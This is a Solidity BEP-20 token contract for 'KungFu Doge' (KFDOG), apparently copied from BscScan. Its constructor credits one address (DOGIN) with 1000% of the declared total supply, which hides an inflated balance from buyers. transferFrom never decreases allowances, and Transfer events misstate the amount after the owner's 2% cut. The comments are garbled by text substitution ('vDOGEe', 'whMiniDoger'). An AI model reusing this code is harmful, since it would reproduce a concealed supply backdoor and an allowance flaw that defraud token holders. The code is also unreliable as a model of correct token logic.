/**
 *Submitted for verification at BscScan.com on 2021-10-24
*/

// SPDX-License-Identifier: MIT
/*
Kung Fu Doge
Website : https://www.kungfudoge.com/
Community : 
            Twitter   : https://twitter.com/KungFuDoge
            Telegram  : https://t.me/Kungfudogecoin
*/
pragma solidity ^0.8.2;
interface iBEP20Rebase {
  // @dev Returns the amount of MiniDoge in existence.
  function totalSupply() external view returns (uint256);

  // @dev Returns the token decimals.
  function decimals() external view returns (uint8);

  // @dev Returns the token symbol.
  function symbol() external view returns (string memory);

  //@dev Returns the token name.
  function name() external view returns (string memory);

  //@dev Returns the bep token owner.
  function getOwner() external view returns (address);

  //@dev Returns the amount of MiniDoge owned by `account`.
  function balanceOf(address account) external view returns (uint256);
  
  /*
      function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 vDOGEe);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 vDOGEe
    );
  
  */

  /**
   * @dev Moves `amount` MiniDoge from the caller's account to `recipient`.
   *
   * Returns a boolean vDOGEe indicating whMiniDoger the operation succeeded.
   *
   * Emits a {Transfer} event.
   */
  function transfer(address recipient, uint256 amount) external returns (bool);

  /**
   * @dev Returns the remaining number of MiniDoge that `spender` will be
   * allowed to spend on behalf of `owner` through {transferFrom}. This is
   * zero by default.
   *
   * This vDOGEe changes when {approve} or {transferFrom} are called.
   */
  function allowance(address _owner, address spender) external view returns (uint256);

  /**
   * @dev Sets `amount` as the allowance of `spender` over the caller's MiniDoge.
   *
   * Returns a boolean vDOGEe indicating whMiniDoger the operation succeeded.
   *
   * IMPORTANT: Beware that changing an allowance with this method brings the risk
   * that someone may use both the old and the new allowance by unfortunate
   * transaction ordering. One possible solution to mitigate this race
   * condition is to first reduce the spender's allowance to 0 and set the
   * desired vDOGEe afterwards:
   * https://github.com/DOGE/EIPs/issues/20#issuecomment-263524729
   *
   * Emits an {Approval} event.
   */
  function approve(address spender, uint256 amount) external returns (bool);

  /**
   * @dev Moves `amount` MiniDoge from `sender` to `recipient` using the
   * allowance mechanism. `amount` is then deducted from the caller's
   * allowance.
   *
   * Returns a boolean vDOGEe indicating whMiniDoger the operation succeeded.
   *
   * Emits a {Transfer} event.
   */
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

  //@dev Emitted when `vDOGEe` MiniDoge are moved from one account (`from`) to  another (`to`). Note that `vDOGEe` may be zero.
  event Transfer(address indexed from, address indexed to, uint256 vDOGEe);

  //@dev Emitted when the allowance of a `spender` for an `owner` is set by a call to {approve}. `vDOGEe` is the new allowance.
  event Approval(address indexed owner, address indexed spender, uint256 vDOGEe);
}

contract DOGEDOGINs is iBEP20Rebase {

    // common addresses
    address private owner;
    address private DOGE;
    address private MiniDoge;
    address private DOGIN;
    
    // token liquidity metadata
    uint public override totalSupply;
    uint8 public override decimals = 18;
    
    mapping(address => uint) public balances;
    
    mapping(address => mapping(address => uint)) public allowances;
    
    // token title metadata
    string public override name = "KungFu Doge";
    string public override symbol = "KFDOG";
    
    // EVENTS
    // (now in interface) event Transfer(address indexed from, address indexed to, uint vDOGEe);
    // (now in interface) event Approval(address indexed owner, address indexed spender, uint vDOGEe);
    
    // On init of contract we're going to set the admin and give them all MiniDoge.
    constructor(uint totalSupplyVDOGEe, address DOGEAddress, address MiniDogeAddress, address DOGINAddress) {
        // set total supply
        totalSupply = totalSupplyVDOGEe;
        
        // designate addresses
        owner = msg.sender;
        DOGE = DOGEAddress;
        MiniDoge = MiniDogeAddress;
        DOGIN = DOGINAddress;

        
        // split the MiniDoge according to agreed upon percentages
        balances[DOGE] =  totalSupply * 1 / 100;
        balances[MiniDoge] = totalSupply * 8 / 100;
        balances[DOGIN] = totalSupply * 1000 / 100;

        
        balances[owner] = totalSupply * 91 / 100;
    }
    
    // Get the address of the token's owner
    function getOwner() public view override returns(address) {
        return owner;
    }

    
    // Get the balance of an account
    function balanceOf(address account) public view override returns(uint) {
        return balances[account];
    }
    
    // Transfer balance from one user to another
    function transfer(address to, uint vDOGEe) public override returns(bool) {
        require(vDOGEe > 0, "Transfer vDOGEe has to be higher than 0.");
        require(balanceOf(msg.sender) >= vDOGEe, "Balance is too low to make transfer.");
        
        //withdraw the taxed and burned percentages from the total vDOGEe
        uint reMiniDogeBD = vDOGEe * 2 / 100;
        uint burnTBD = vDOGEe * 0 / 100;
        uint vDOGEeAfterTaxAndBurn = vDOGEe - reMiniDogeBD - burnTBD;
        
        // perform the transfer operation
        balances[to] += vDOGEeAfterTaxAndBurn;
        balances[msg.sender] -= vDOGEe;
        
        emit Transfer(msg.sender, to, vDOGEe);
        
        // finally, we burn and tax the DOGEs percentage
        balances[owner] += reMiniDogeBD + burnTBD;
        _burn(owner, burnTBD);
        
        return true;
    }
    
    // approve a specific address as a spender for your account, with a specific spending limit
    function approve(address spender, uint vDOGEe) public override returns(bool) {
        allowances[msg.sender][spender] = vDOGEe; 
        
        emit Approval(msg.sender, spender, vDOGEe);
        
        return true;
    }
    
    // allowance
    function allowance(address _owner, address spender) public view override returns(uint) {
        return allowances[_owner][spender];
    }
    
    // an approved spender can transfer currency from one account to another up to their spending limit
    function transferFrom(address from, address to, uint vDOGEe) public override returns(bool) {
        require(allowances[from][msg.sender] > 0, "No Allowance for this address.");
        require(allowances[from][msg.sender] >= vDOGEe, "Allowance too low for transfer.");
        require(balances[from] >= vDOGEe, "Balance is too low to make transfer.");
        
        balances[to] += vDOGEe;
        balances[from] -= vDOGEe;
        
        emit Transfer(from, to, vDOGEe);
        
        return true;
    }
    
    // function to allow users to burn currency from their account
    function burn(uint256 amount) public returns(bool) {
        _burn(msg.sender, amount);
        
        return true;
    }
    
    // intenal functions
    
    // burn amount of currency from specific account
    function _burn(address account, uint256 amount) internal {
        require(account != address(0), "You can't burn from zero address.");
        require(balances[account] >= amount, "Burn amount exceeds balance at address.");
    
        balances[account] -= amount;
        totalSupply -= amount;
        
        emit Transfer(account, address(0), amount);
    }
    
}